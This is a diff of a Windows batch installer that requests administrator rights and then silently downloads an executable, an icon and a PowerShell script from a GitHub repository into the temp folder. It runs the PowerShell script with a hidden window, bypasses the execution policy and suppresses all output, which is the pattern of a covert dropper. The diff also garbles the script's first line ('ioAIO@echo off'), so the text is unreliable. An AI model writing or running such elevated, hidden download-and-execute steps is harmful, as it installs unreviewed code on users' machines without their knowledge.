@@ -1,4 +1,4 @@
-@echo off
+ioAIO@echo off
 :: BatchGotAdmin
 
 :-------------------------------------
@@ -34,12 +34,12 @@ if '%errorlevel%' NEQ '0' (
     cd %TEMP%
 
     REM --> Download files silently using PowerShell
-    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile XevioAIO.exe" >nul 2>&1
+    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/XevioAIO.exe' -OutFile XevioAIO.exe" >nul 2>&1
     powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/ahk.ico' -OutFile ahk.ico" >nul 2>&1
-    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/shortcut.ps1' -OutFile shortcut2.ps1" >nul 2>&1
+    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/shortcut2.ps1' -OutFile shortcut2.ps1" >nul 2>&1
 
     REM --> Check if CritScript.exe exists silently
-    if not exist "CritScript.exe" (
+    if not exist "XevioAIO.exe" (
         exit /b
     )
 
@@ -57,12 +57,12 @@ if '%errorlevel%' NEQ '0' (
     )
 
 :CreateShortcut
-    REM --> Create shortcut for ZOMBIES.AHK if it exists
-    set "zombiesScript=%TEMP%\ZOMBIES.AHK"
+    REM --> Create shortcut for AIO.AHK if it exists
+    set "zombiesScript=%TEMP%\AIO.AHK"
     set "iconPath=%TEMP%\ahk.ico"
 
     if exist "%zombiesScript%" (
-        powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\shortcut.ps1" >nul 2>&1
+        powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\shortcut2.ps1" >nul 2>&1
     )
 
     :ExitScript
